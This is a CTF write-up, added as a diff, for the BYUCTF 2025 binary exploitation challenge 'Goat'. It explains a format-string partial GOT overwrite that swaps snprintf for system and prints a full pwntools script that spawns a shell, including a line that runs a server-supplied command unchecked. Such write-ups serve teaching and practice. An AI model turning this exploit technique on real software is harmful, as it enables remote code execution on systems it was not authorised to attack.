@@ -1,0 +1,132 @@
+---
+title: "Goat — BYUCTF 2025"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2025-goat"
+order: 267
+writeupKind: "challenge"
+ctfSlug: "byuctf-2025"
+ctfTitle: "BYUCTF 2025"
+---
+
+# Goat — BYUCTF 2025
+
+> **Category:** `Binary Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{n0w_y0u're_the_g0at!}`  
+> **Source Path:** `pwn/goat`
+
+---
+
+## Challenge Description
+
+```text
+To prevent excessive brute forcing for those experiencing a skissue, I made sure to add a PoW.
+
+`nc goat.chal.cyberjousting.com 1349`
+
+[goat.zip]
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/pwn/goat)
+- [pwn/goat/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/goat/README.md)
+- [pwn/goat/goat.zip](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/goat/goat.zip)
+- [pwn/goat/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/goat/solve.py)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2025 source material for the Binary Exploitation challenge **Goat**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [pwn/goat/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/goat/README.md)
+
+This challenge gives you a single format string vulnerability through your name. This can leak information or give you an arbitrary write primitive, but not both. The problem here is that ASLR is enabled, so arbitrary write only works in the executable section of memory because PIE is disabled (meaning no libc/stack writing). Leaking stuff won't do anything because there's no way to use it afterwards. 
+
+The solution is a partial GOT overwrite - since RELRO is only partially enabled, you can overwrite GOT entries that have been initialized. The intended GOT entry to overwrite is `snprintf` because it's < 0xffff bytes away from `system`, meaning `system` and `snprintf` will have all but the last 2 bytes of their addresses overlapping. Their distance is also far enough away that when that 1/16 chance happens, the first nibble is either 0 or 1, and the last 3 are the nibbles of the address of `system` in this libc. That's just a long way of saying the partial overwrite has approximately a 1/16 or 1/32 chance of working (idk I can't do math), which is doable. 
+
+Once a format string is used to change the GOT address for `snprintf` to `system`, the confirmation gets stored in the same buffer passed in as the first argument to `snprintf()` (which is actually `system()`), so using `/bin/sh` as your confirmation will cause it to run `system("/bin/sh")`. 
+
+I've automated solving the PoW and exploiting the vulnerability in `solve.py`. Due to the low brute force, just run it until you don't see EOF (should take like 30 seconds max). 
+
+**Flag** - `byuctf{n0w_y0u're_the_g0at!}`
+
+---
+
+## Full Exploit Script
+
+Source: [pwn/goat/solve.py](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/pwn/goat/solve.py)
+
+```python
+from pwn import *
+from subprocess import getoutput
+
+
+binary = "./goat"
+elf = context.binary = ELF(binary, checksec=False)
+
+gs = """
+break *main+175
+continue
+"""
+
+if args.REMOTE:
+    p = remote("goat.chal.cyberjousting.com", 1349)
+
+    ### SOLVE POW ###
+    p.recvline()
+    cmd = p.recvline().decode().strip()
+    print(f"Solving POW: {cmd}")
+    answer = getoutput(cmd)
+    p.sendline(answer.encode())
+elif args.GDB:
+    context.terminal = ["tmux", "splitw", "-h"]
+    p = gdb.debug(binary, gdbscript=gs)
+else:
+    p = elf.process()
+
+
+
+### OVERWRITE SNPRINTF ###
+"""
+`0x740` are the 3 known nibbles of `system`.
+
+I also append `0x1` because `system` and `snprintf` are far enough apart that
+if all bytes of their address are the same except the last 2 bytes, the most
+significant nibble of the 2 bytes has to be `0x0` or `0x1`. 
+"""
+
+p.recvuntil(b'GOAT...')
+payload = fmtstr_payload(8, {elf.got["snprintf"]: p16(0x1740)}, numbwritten=24, write_size='short')
+print(payload)
+p.sendline(payload)
+
+
+### SET UP FOR SYSTEM ###
+p.recvuntil(b'@@')
+p.sendline(b"/bin/sh\x00")
+
+p.interactive()
+```
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2025 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
